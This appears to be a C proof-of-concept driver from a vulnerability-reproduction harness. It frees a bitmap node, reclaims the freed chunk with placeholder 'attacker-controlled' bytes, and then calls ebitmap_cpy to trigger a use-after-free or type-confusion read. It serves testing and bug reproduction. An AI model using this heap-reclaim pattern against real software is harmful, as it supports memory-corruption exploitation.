#include <string.h>
#include "harness_types.h"
// klee removed for replay
#include <stdlib.h>
#include <stdint.h>

/* Driver to trigger UAF/type-confusion read in ebitmap_cpy at new->startbit = n->startbit */
int ebitmap_cpy(ebitmap_t *dst, const ebitmap_t *src); /* from harness */

int main() {
    // Allocate destination and source bitmaps concretely
    ebitmap_t *dst = (ebitmap_t *)calloc(1, sizeof(ebitmap_t));
    ebitmap_t *src = (ebitmap_t *)calloc(1, sizeof(ebitmap_t));

    // Create a single node for src and then free it to make src->node a dangling pointer
    ebitmap_node_t *node = (ebitmap_node_t *)malloc(sizeof(ebitmap_node_t));
    // Initialize fields (values don't matter; will be UAF after free)
    node->startbit = 0x12345678u;
    node->map[0] = 0xDEADBEEFDEADBEEFul;
    node->next = NULL;

    // Point src->node to this node, then free the node to create a stale reference
    src->node = node;
    free(node);  // src->node now dangles (UAF setup)

    // Optionally, try to reclaim the chunk with attacker-controlled data of same size
    // to simulate type confusion leak (allocator often returns same address).
    void *reclaim = malloc(sizeof(ebitmap_node_t));
    if (reclaim) {
        { static const unsigned char reclaim_payload_data[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; memcpy(reclaim, reclaim_payload_data, (sizeof(ebitmap_node_t) < sizeof(reclaim_payload_data)) ? sizeof(ebitmap_node_t) : sizeof(reclaim_payload_data)); };
        // Do not modify src->node; if allocator reused the chunk, src->node points here now.
    }

    // Call entry (must directly call vul func); this will dereference the freed pointer
    ebitmap_cpy(dst, src);
    return 0;
}
